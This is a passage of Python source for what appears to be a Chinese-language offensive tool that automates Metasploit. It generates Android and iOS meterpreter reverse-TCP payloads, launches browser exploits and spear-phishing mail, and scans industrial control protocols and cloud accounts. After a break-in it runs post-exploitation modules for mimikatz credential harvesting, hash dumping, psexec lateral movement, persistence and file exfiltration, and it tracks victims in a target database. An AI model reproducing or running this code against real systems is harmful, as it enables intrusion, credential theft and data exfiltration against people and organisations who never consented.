                "SRVHOST": "0.0.0.0",
                "SRVPORT": str(local_port),
                "TARGETURI": "/"
            }
            
            success, output = self._execute_se_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def create_spear_phishing(self, target_list, template_file, attachment=None):
        
        spear_modules = [
            "auxiliary/client/smtp/emailer"
        ]
        
        results = {}
        for module in spear_modules:
            options = {
                "RHOSTS": "smtp.example.com",
                "TARGETS": target_list,
                "TEMPLATE": template_file
            }
            
            if attachment:
                options["ATTACHMENT"] = attachment
            
            success, output = self._execute_se_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_se_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("exploit" if "exploit" in module_name else "run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class MobileAttackManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_mobile_modules(self, platform=None):
        
        if platform == 'android':
            return self.module_manager.search_modules("android")
        elif platform == 'ios':
            return self.module_manager.search_modules("ios")
        else:
            return self.module_manager.search_modules("android") + \
                   self.module_manager.search_modules("ios")
    
    def android_attack(self, target_ip, payload_options):
        
        android_modules = [
            "exploit/multi/handler",
            "payload/android/meterpreter/reverse_tcp"
        ]
        
        results = {}
        for module in android_modules:
            options = {
                "LHOST": target_ip,
                "LPORT": "4444"
            }
            options.update(payload_options)
            
            success, output = self._execute_mobile_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def ios_attack(self, target_ip, payload_options):
        
        ios_modules = [
            "exploit/apple_ios/browser/safari_libtiff",
            "payload/apple_ios/aarch64/meterpreter_reverse_tcp"
        ]
        
        results = {}
        for module in ios_modules:
            options = {
                "LHOST": target_ip,
                "LPORT": "4444"
            }
            options.update(payload_options)
            
            success, output = self._execute_mobile_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def create_mobile_payload(self, platform, lhost, lport, output_file):
        
        payloads = {
            'android': "android/meterpreter/reverse_tcp",
            'ios': "apple_ios/aarch64/meterpreter_reverse_tcp"
        }
        
        if platform not in payloads:
            return False, f"不支持的平台: {platform}"
        
        cmd = [
            "msfvenom",
            "-p", payloads[platform],
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-o", output_file
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                return True, f"Payload已生成: {output_file}"
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "生成超时"
        except Exception as e:
            return False, f"生成错误: {e}"
    
    def mobile_browser_exploit(self, platform, lhost, lport):
        
        browser_modules = {
            'android': "exploit/android/browser/stagefright_mp4_tx3g_64bit",
            'ios': "exploit/apple_ios/browser/safari_libtiff"
        }
        
        if platform not in browser_modules:
            return False, f"不支持的平台: {platform}"
        
        options = {
            "LHOST": lhost,
            "LPORT": lport,
            "SRVHOST": lhost,
            "SRVPORT": "8080"
        }
        
        return self._execute_mobile_module(browser_modules[platform], options)
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_mobile_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        if "exploit" in module_name or "payload" in module_name:
            commands.append("exploit")
        else:
            commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class ICSAttackManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_ics_modules(self):
        
        ics_keywords = ['scada', 'modbus', 's7', 'profinet', 'dnp3']
        
        all_modules = []
        for keyword in ics_keywords:
            all_modules.extend(self.module_manager.search_modules(keyword))
        
        return all_modules
    
    def modbus_attack(self, target_ip, port=502):
        
        modbus_modules = [
            "auxiliary/scanner/scada/modbus_banner_grabbing",
            "auxiliary/scanner/scada/modbusdetect"
        ]
        
        results = {}
        for module in modbus_modules:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port)
            }
            
            success, output = self._execute_ics_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def siemens_s7_attack(self, target_ip, port=102):
        
        s7_modules = [
            "auxiliary/scanner/scada/s7_comm_enum",
            "auxiliary/scanner/scada/siemens_wincc_webexec"
        ]
        
        results = {}
        for module in s7_modules:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port)
            }
            
            success, output = self._execute_ics_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def profinet_attack(self, target_ip, port=34964):
        
        profinet_modules = [
            "auxiliary/scanner/scada/profinet_siemens"
        ]
        
        results = {}
        for module in profinet_modules:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port)
            }
            
            success, output = self._execute_ics_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def dnp3_attack(self, target_ip, port=20000):
        
        dnp3_modules = [
            "auxiliary/scanner/scada/dnp3_enum"
        ]
        
        results = {}
        for module in dnp3_modules:
            options = {
                "RHOSTS": target_ip,
                "RPORT": str(port)
            }
            
            success, output = self._execute_ics_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_ics_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class CloudAttackManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_cloud_modules(self, cloud_provider=None):
        
        cloud_keywords = {
            'aws': 'aws',
            'azure': 'azure',
            'gcp': 'gcp',
            'google': 'google',
            'cloud': 'cloud'
        }
        
        if cloud_provider and cloud_provider in cloud_keywords:
            return self.module_manager.search_modules(cloud_keywords[cloud_provider])
        else:
            all_modules = []
            for keyword in cloud_keywords.values():
                all_modules.extend(self.module_manager.search_modules(keyword))
            return all_modules
    
    def aws_enumeration(self, access_key, secret_key, region="us-east-1"):
        
        aws_modules = [
            "auxiliary/scanner/http/aws_enum",
            "auxiliary/scanner/http/aws_ec2_enum"
        ]
        
        results = {}
        for module in aws_modules:
            options = {
                "ACCESS_KEY": access_key,
                "SECRET_KEY": secret_key,
                "REGION": region
            }
            
            success, output = self._execute_cloud_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def azure_enumeration(self, tenant_id, client_id, client_secret):
        
        azure_modules = [
            "auxiliary/scanner/http/azure_enum"
        ]
        
        results = {}
        for module in azure_modules:
            options = {
                "TENANT_ID": tenant_id,
                "CLIENT_ID": client_id,
                "CLIENT_SECRET": client_secret
            }
            
            success, output = self._execute_cloud_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def gcp_enumeration(self, project_id, service_account_key):
        
        gcp_modules = [
            "auxiliary/scanner/http/gcp_enum"
        ]
        
        results = {}
        for module in gcp_modules:
            options = {
                "PROJECT_ID": project_id,
                "SERVICE_ACCOUNT_KEY": service_account_key
            }
            
            success, output = self._execute_cloud_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def cloud_storage_attack(self, provider, bucket_name, access_key=None, secret_key=None):
        
        storage_modules = {
            'aws': "auxiliary/scanner/http/aws_s3_enum",
            'azure': "auxiliary/scanner/http/azure_blob_enum",
            'gcp': "auxiliary/scanner/http/gcp_storage_enum"
        }
        
        if provider not in storage_modules:
            return {"error": f"不支持的云提供商: {provider}"}
        
        options = {"BUCKET": bucket_name}
        if access_key and secret_key:
            options["ACCESS_KEY"] = access_key
            options["SECRET_KEY"] = secret_key
        
        success, output = self._execute_cloud_module(storage_modules[provider], options)
        return {storage_modules[provider]: {"success": success, "output": output}}
    
    def cloud_compute_attack(self, provider, instance_id, credentials):
        
        compute_modules = {
            'aws': "auxiliary/scanner/http/aws_ec2_enum",
            'azure': "auxiliary/scanner/http/azure_vm_enum",
            'gcp': "auxiliary/scanner/http/gcp_compute_enum"
        }
        
        if provider not in compute_modules:
            return {"error": f"不支持的云提供商: {provider}"}
        
        options = {"INSTANCE_ID": instance_id}
        options.update(credentials)
        
        success, output = self._execute_cloud_module(compute_modules[provider], options)
        return {compute_modules[provider]: {"success": success, "output": output}}
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_cloud_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class PostExploitationManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def get_post_modules(self, platform=None):
        
        if platform:
            return self.module_manager.search_modules("", module_type="post", platform=platform)
        else:
            return self.module_manager.get_msf_modules("post")
    
    def execute_post_module(self, session_id, module_name, options=None):
        
        module_info = self.module_manager.get_module_info(module_name)
        if not module_info:
            return False, "模块未找到"
        
        commands = [
            f"use {module_name}",
            f"set SESSION {session_id}"
        ]
        
        if options:
            for key, value in options.items():
                if value:
                    commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"
    
    def gather_system_info(self, session_id):
        
        info_modules = [
            "post/multi/gather/env",
            "post/multi/gather/hostname",
            "post/linux/gather/enum_system",
            "post/windows/gather/enum_computers",
            "post/windows/gather/enum_logged_on_users"
        ]
        
        results = {}
        for module in info_modules:
            success, output = self.execute_post_module(session_id, module)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def credential_harvesting(self, session_id):
        
        credential_modules = [
            "post/multi/gather/hashdump",
            "post/windows/gather/credentials/mimikatz",
            "post/linux/gather/hashdump",
            "post/multi/gather/firefox_creds",
            "post/windows/gather/credentials/vnc"
        ]
        
        results = {}
        for module in credential_modules:
            success, output = self.execute_post_module(session_id, module)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def privilege_escalation(self, session_id):
        
        privilege_modules = [
            "post/multi/recon/local_exploit_suggester",
            "post/windows/gather/enum_patches",
            "post/linux/gather/enum_system",
            "post/windows/manage/priv_migrate"
        ]
        
        results = {}
        for module in privilege_modules:
            success, output = self.execute_post_module(session_id, module)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def lateral_movement(self, session_id, target_hosts):
        
        lateral_modules = [
            "post/windows/gather/enum_shares",
            "post/multi/gather/ping_sweep",
            "post/windows/manage/psexec",
            "post/windows/manage/psexec_psh"
        ]
        
        results = {}
        for module in lateral_modules:
            options = {"RHOSTS": target_hosts} if "psexec" in module else {}
            success, output = self.execute_post_module(session_id, module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def persistence(self, session_id):
        
        persistence_modules = [
            "post/windows/manage/persistence",
            "post/linux/manage/sshkey_persistence",
            "post/multi/manage/shell_to_meterpreter"
        ]
        
        results = {}
        for module in persistence_modules:
            success, output = self.execute_post_module(session_id, module)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def network_discovery(self, session_id):
        
        network_modules = [
            "post/windows/gather/arp_scanner",
            "post/multi/gather/ping_sweep",
            "post/linux/gather/enum_network"
        ]
        
        results = {}
        for module in network_modules:
            success, output = self.execute_post_module(session_id, module)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def data_exfiltration(self, session_id, files_to_exfiltrate):
        
        exfiltration_modules = [
            "post/multi/gather/download_file",
            "post/windows/gather/dumplinks"
        ]
        
        results = {}
        for module in exfiltration_modules:
            options = {}
            if "download" in module and files_to_exfiltrate:
                options["FILE"] = files_to_exfiltrate[0]
            
            success, output = self.execute_post_module(session_id, module, options)
            results[module] = {"success": success, "output": output}
        
        return results

class SessionManager:

    def __init__(self, module_manager):
        self.module_manager = module_manager
        self.active_sessions = []
    
    def list_sessions(self):
        
        try:
            cmd = ["msfconsole", "-qx", "sessions; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                sessions = self._parse_sessions(result.stdout)
                self.active_sessions = sessions
                return sessions
            else:
                return []
        except subprocess.TimeoutExpired:
            logger.error("获取会话列表超时")
            return []
        except Exception as e:
            logger.error(f"获取会话列表失败: {e}")
            return []
    
    def _parse_sessions(self, output):
        
        sessions = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            if re.match(r'^\d+\s+[\d\.]+:\d+\s+[\d\.]+:\d+\s+\w+', line):
                parts = line.split()
                if len(parts) >= 5:
                    session = {
                        'id': parts[0],
                        'type': parts[3],
                        'platform': parts[4],
                        'info': ' '.join(parts[1:3])
                    }
                    sessions.append(session)
        
        return sessions
    
    def interact_with_session(self, session_id):
        
        try:
            cmd = ["msfconsole", "-qx", f"sessions -i {session_id}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.returncode == 0, result.stdout
        except subprocess.TimeoutExpired:
            return False, "交互超时"
        except Exception as e:
            return False, f"交互失败: {e}"
    
    def execute_in_session(self, session_id, command):
        
        try:
            cmd = ["msfconsole", "-qx", f"sessions -c '{command}' -i {session_id}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.returncode == 0, result.stdout
        except subprocess.TimeoutExpired:
            return False, "执行命令超时"
        except Exception as e:
            return False, f"执行命令失败: {e}"
    
    def kill_session(self, session_id):
        
        try:
            cmd = ["msfconsole", "-qx", f"sessions -k {session_id}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.returncode == 0, "会话已终止"
        except subprocess.TimeoutExpired:
            return False, "终止会话超时"
        except Exception as e:
            return False, f"终止会话失败: {e}"
    
    def upgrade_shell(self, session_id):
        
        try:
            cmd = ["msfconsole", "-qx", f"sessions -u {session_id}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.returncode == 0, "升级成功"
        except subprocess.TimeoutExpired:
            return False, "升级超时"
        except Exception as e:
            return False, f"升级失败: {e}"
    
    def migrate_process(self, session_id, target_pid=None):
        
        try:
            if target_pid:
                cmd = ["msfconsole", "-qx", f"sessions -c 'migrate {target_pid}' -i {session_id}"]
            else:
                cmd = ["msfconsole", "-qx", f"sessions -c 'migrate' -i {session_id}"]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.returncode == 0, "进程迁移成功"
        except subprocess.TimeoutExpired:
            return False, "进程迁移超时"
        except Exception as e:
            return False, f"进程迁移失败: {e}"
    
    def get_session_info(self, session_id):
        
        try:
            cmd = ["msfconsole", "-qx", f"sessions -i {session_id} -C sysinfo; exit"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return result.returncode == 0, result.stdout
        except subprocess.TimeoutExpired:
            return False, "获取会话信息超时"
        except Exception as e:
            return False, f"获取会话信息失败: {e}"

class AdvancedScanner:

    def __init__(self, module_manager):
        self.module_manager = module_manager
    
    def port_scan(self, target, ports="1-1000", threads=10):
        
        scan_modules = [
            "auxiliary/scanner/portscan/tcp",
            "auxiliary/scanner/portscan/syn"
        ]
        
        results = {}
        for module in scan_modules:
            options = {
                "RHOSTS": target,
                "PORTS": ports,
                "THREADS": str(threads)
            }
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def service_detection(self, target, ports=None):
        
        service_modules = [
            "auxiliary/scanner/http/http_version",
            "auxiliary/scanner/ssh/ssh_version",
            "auxiliary/scanner/smb/smb_version",
            "auxiliary/scanner/ftp/ftp_version",
            "auxiliary/scanner/telnet/telnet_version"
        ]
        
        results = {}
        for module in service_modules:
            options = {"RHOSTS": target}
            
            if ports and "http" in module:
                options["RPORT"] = str(ports)
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def vulnerability_scan(self, target):
        
        vuln_modules = [
            "auxiliary/scanner/http/dir_scanner",
            "auxiliary/scanner/http/robots_txt",
            "auxiliary/scanner/smb/smb_enumshares",
            "auxiliary/scanner/ssh/ssh_enumusers",
            "auxiliary/scanner/http/http_vuln_scanner"
        ]
        
        results = {}
        for module in vuln_modules:
            options = {"RHOSTS": target}
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def os_detection(self, target):
        
        os_modules = [
            "auxiliary/scanner/http/http_version",
            "auxiliary/scanner/ssh/ssh_version"
        ]
        
        results = {}
        for module in os_modules:
            options = {"RHOSTS": target}
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def smb_enumeration(self, target):
        
        smb_modules = [
            "auxiliary/scanner/smb/smb_enumshares",
            "auxiliary/scanner/smb/smb_enumusers",
            "auxiliary/scanner/smb/smb_lookupsid"
        ]
        
        results = {}
        for module in smb_modules:
            options = {"RHOSTS": target}
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def snmp_enumeration(self, target, community_string="public"):
        
        snmp_modules = [
            "auxiliary/scanner/snmp/snmp_enum",
            "auxiliary/scanner/snmp/snmp_enumshares"
        ]
        
        results = {}
        for module in snmp_modules:
            options = {
                "RHOSTS": target,
                "COMMUNITY": community_string
            }
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    def dns_enumeration(self, target_domain):
        
        dns_modules = [
            "auxiliary/gather/dns_enum"
        ]
        
        results = {}
        for module in dns_modules:
            options = {"DOMAIN": target_domain}
            
            success, output = self._execute_scan_module(module, options)
            results[module] = {"success": success, "output": output}
        
        return results
    
    @retry_on_failure(max_retries=2, delay=1)
    def _execute_scan_module(self, module_name, options):
        
        commands = [f"use {module_name}"]
        
        for key, value in options.items():
            if value:
                commands.append(f"set {key} {value}")
        
        commands.append("run")
        
        try:
            cmd_str = " ; ".join(commands)
            full_cmd = ["msfconsole", "-qx", cmd_str]
            
            result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=180)
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, result.stderr
        except subprocess.TimeoutExpired:
            return False, "执行超时"
        except Exception as e:
            return False, f"执行错误: {e}"

class ReportGenerator:

    def __init__(self):
        self.report_data = {}
    
    def add_scan_results(self, target, scan_type, results):
        
        if target not in self.report_data:
            self.report_data[target] = {}
        
        self.report_data[target][scan_type] = results
    
    def add_exploit_results(self, target, exploit_name, success, output):
        
        if target not in self.report_data:
            self.report_data[target] = {}
        
        if "exploits" not in self.report_data[target]:
            self.report_data[target]["exploits"] = []
        
        self.report_data[target]["exploits"].append({
            "name": exploit_name,
            "success": success,
            "output": output,
            "timestamp": datetime.now().isoformat()
        })
    
    def add_post_exploit_results(self, target, session_id, results):
        
        if target not in self.report_data:
            self.report_data[target] = {}
        
        self.report_data[target]["post_exploitation"] = {
            "session_id": session_id,
            "results": results,
            "timestamp": datetime.now().isoformat()
        }
    
    def add_payload_info(self, target, payload_type, lhost, lport, output_file):
        
        if target not in self.report_data:
            self.report_data[target] = {}
        
        self.report_data[target]["payload"] = {
            "type": payload_type,
            "lhost": lhost,
            "lport": lport,
            "output_file": output_file,
            "timestamp": datetime.now().isoformat()
        }
    
    def generate_html_report(self, output_file):
        
        target_count = len(self.report_data)
        vuln_count = 0
        exploit_count = 0
        
        for target_data in self.report_data.values():
            if "exploits" in target_data:
                for exploit in target_data["exploits"]:
                    vuln_count += 1
                    if exploit["success"]:
                        exploit_count += 1
        
        content = ""
        for target, data in self.report_data.items():
            content += f'<div class="target"><h2>目标: {target}</h2>'
            
            if any(key in data for key in ['port_scan', 'service_detection', 'vulnerability_scan']):
                content += '<div class="section"><h3>扫描结果</h3>'
                
                for scan_type, results in data.items():
                    if scan_type in ['port_scan', 'service_detection', 'vulnerability_scan']:
                        content += f'<h4>{scan_type.replace("_", " ").title()}</h4>'
                        for module, result in results.items():
                            status_class = "success" if result["success"] else "failure"
                            content += f'<p><span class="{status_class}">{module}</span></p>'
                            if result["output"]:
                                content += f'<pre>{result["output"][:500]}...</pre>'
                
                content += '</div>'
            
            if "exploits" in data:
                content += '<div class="section"><h3>漏洞利用结果</h3>'
                content += '<table>'
                content += '<tr><th>漏洞名称</th><th>状态</th><th>时间</th></tr>'
                
                for exploit in data["exploits"]:
                    status_class = "success" if exploit["success"] else "failure"
                    status_text = "成功" if exploit["success"] else "失败"
                    content += f'<tr><td>{exploit["name"]}</td><td class="{status_class}">{status_text}</td><td>{exploit["timestamp"]}</td></tr>'
                
                content += '</table>'
                content += '</div>'
            
            if "post_exploitation" in data:
                post_data = data["post_exploitation"]
                content += '<div class="section"><h3>后渗透利用</h3>'
                content += f'<p>会话ID: {post_data["session_id"]}</p>'
                content += f'<p>执行时间: {post_data["timestamp"]}</p>'
                
                for module, result in post_data["results"].items():
                    status_class = "success" if result["success"] else "failure"
                    content += f'<p><span class="{status_class}">{module}</span></p>'
                    if result["output"]:
                        content += f'<pre>{result["output"][:300]}...</pre>'
                
                content += '</div>'
            
            if "payload" in data:
                payload_data = data["payload"]
                content += '<div class="section"><h3>Payload信息</h3>'
                content += f'<p>类型: {payload_data["type"]}</p>'
                content += f'<p>监听主机: {payload_data["lhost"]}:{payload_data["lport"]}</p>'
                content += f'<p>输出文件: {payload_data["output_file"]}</p>'
                content += f'<p>生成时间: {payload_data["timestamp"]}</p>'
                content += '</div>'
            
            content += '</div>'
        
        html_content = f
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return output_file
    
    def generate_json_report(self, output_file):
        
        report = {
            "metadata": {
                "generated_at": datetime.now().isoformat(),
                "tool": "终极MSFVenom工具",
                "author": "Alfadi联盟 - XiaoYao",
                "targets_count": len(self.report_data)
            },
            "results": self.report_data
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return output_file
    
    def generate_text_report(self, output_file):
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("渗透测试报告\n")
            f.write("=" * 60 + "\n")
            f.write(f"生成工具: 终极MSFVenom工具\n")
            f.write(f"作者: Alfadi联盟 - XiaoYao\n")
            f.write(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            
            for target, data in self.report_data.items():
                f.write(f"目标: {target}\n")
                f.write("-" * 40 + "\n")
                
                if any(key in data for key in ['port_scan', 'service_detection', 'vulnerability_scan']):
                    f.write("\n扫描结果:\n")
                    
                    for scan_type, results in data.items():
                        if scan_type in ['port_scan', 'service_detection', 'vulnerability_scan']:
                            f.write(f"  {scan_type.replace('_', ' ').title()}:\n")
                            for module, result in results.items():
                                status = "成功" if result["success"] else "失败"
                                f.write(f"    {module}: {status}\n")
                
                if "exploits" in data:
                    f.write("\n漏洞利用结果:\n")
                    for exploit in data["exploits"]:
                        status = "成功" if exploit["success"] else "失败"
                        f.write(f"  {exploit['name']}: {status} ({exploit['timestamp']})\n")
                
                if "post_exploitation" in data:
                    post_data = data["post_exploitation"]
                    f.write(f"\n后渗透利用 (会话 {post_data['session_id']}):\n")
                    for module, result in post_data["results"].items():
                        status = "成功" if result["success"] else "失败"
                        f.write(f"  {module}: {status}\n")
                
                if "payload" in data:
                    payload_data = data["payload"]
                    f.write(f"\nPayload信息:\n")
                    f.write(f"  类型: {payload_data['type']}\n")
                    f.write(f"  监听: {payload_data['lhost']}:{payload_data['lport']}\n")
                    f.write(f"  文件: {payload_data['output_file']}\n")
                
                f.write("\n")
        
        return output_file
    
    def generate_markdown_report(self, output_file):
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"**生成时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"**生成工具**: 终极MSFVenom工具 - Alfadi联盟 - XiaoYao\n\n")
            
            for target, data in self.report_data.items():
                f.write(f"## 目标: {target}\n\n")
                
                if any(key in data for key in ['port_scan', 'service_detection', 'vulnerability_scan']):
                    f.write("### 扫描结果:\n\n")
                    
                    for scan_type, results in data.items():
                        if scan_type in ['port_scan', 'service_detection', 'vulnerability_scan']:
                            f.write(f"#### {scan_type.replace('_', ' ').title()}:\n")
                            for module, result in results.items():
                                status = "✅ 成功" if result["success"] else "❌ 失败"
                                f.write(f"- **{module}**: {status}\n")
                            f.write("\n")
                
                if "exploits" in data:
                    f.write("### 利用结果:\n")
                    f.write("| 漏洞名称 | 状态 | 时间 |\n")
                    f.write("|----------|------|------|\n")
                    
                    for exploit in data["exploits"]:
                        status = "✅ 成功" if exploit["success"] else "❌ 失败"
                        f.write(f"| {exploit['name']} | {status} | {exploit['timestamp']} |\n")
                    f.write("\n")
                
                f.write("\n")
        
        return output_file

class TargetManager:

    def __init__(self, db_path="targets.db"):
        self.db_path = db_path
        self._init_database()
    
    def _init_database(self):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # 创建目标表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    hostname TEXT,
                    os TEXT,
                    status TEXT DEFAULT 'new',
                    services_json TEXT DEFAULT '{}',
                    vulnerabilities_json TEXT DEFAULT '{}',
                    notes TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # 创建目标组表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS target_groups (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    description TEXT,
                    targets_json TEXT DEFAULT '{}',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # 创建扫描结果表
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scan_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id TEXT NOT NULL,
                    scan_type TEXT NOT NULL,
                    results_json TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            logger.error(f"初始化目标数据库失败: {e}")

    def add_target(self, ip, hostname=None, os=None, services=None, vulnerabilities=None, notes=None):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "INSERT INTO targets (ip, hostname, os, status, services_json, vulnerabilities_json, notes) VALUES (?, ?, ?, ?, ?, ?, ?)", 
                (
                    ip,
                    hostname,
                    os,
                    'new',
                    json.dumps(services) if services else '{}',
                    json.dumps(vulnerabilities) if vulnerabilities else '{}',
                    notes
                )
            )
            
            conn.commit()
            conn.close()
            
            return True
        except sqlite3.Error as e:
            logger.error(f"添加目标失败: {e}")
            return False
    
    def update_target(self, target_id, **kwargs):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            set_clause = []
            values = []
            
            for key, value in kwargs.items():
                if key in ['services', 'vulnerabilities']:
                    set_clause.append(f"{key}_json = ?")
                    values.append(json.dumps(value) if value else '{}')
                else:
                    set_clause.append(f"{key} = ?")
                    values.append(value)
            
            set_clause.append("updated_at = CURRENT_TIMESTAMP")
            
            query = f"UPDATE targets SET {', '.join(set_clause)} WHERE id = ?"
            values.append(target_id)
            
            cursor.execute(query, values)
            conn.commit()
            conn.close()
            
            return True
        except sqlite3.Error as e:
            logger.error(f"更新目标信息失败: {e}")
            return False
    
    def get_targets(self, status=None):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            if status:
                cursor.execute("SELECT * FROM targets WHERE status = ?", (status,))
            else:
                cursor.execute("SELECT * FROM targets")
            
            targets = []
            for row in cursor.fetchall():
                target = {
                    'id': row[0],
                    'ip': row[1],
                    'hostname': row[2],
                    'os': row[3],
                    'status': row[4],
                    'services': json.loads(row[5]) if row[5] else {},
                    'vulnerabilities': json.loads(row[6]) if row[6] else {},
                    'notes': row[7],
                    'created_at': row[8],
                    'updated_at': row[9]
                }
                targets.append(target)
            
            conn.close()
            return targets
        except sqlite3.Error as e:
            logger.error(f"获取目标列表失败: {e}")
            return []
    
    def create_target_group(self, name, description, targets):
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute(
                "INSERT INTO target_groups (name, description, targets_json) VALUES (?, ?, ?)", 
                (
                    name,
                    description,
                    json.dumps(targets)
                )
            )
            
            conn.commit()
            conn.close()
            
            return True
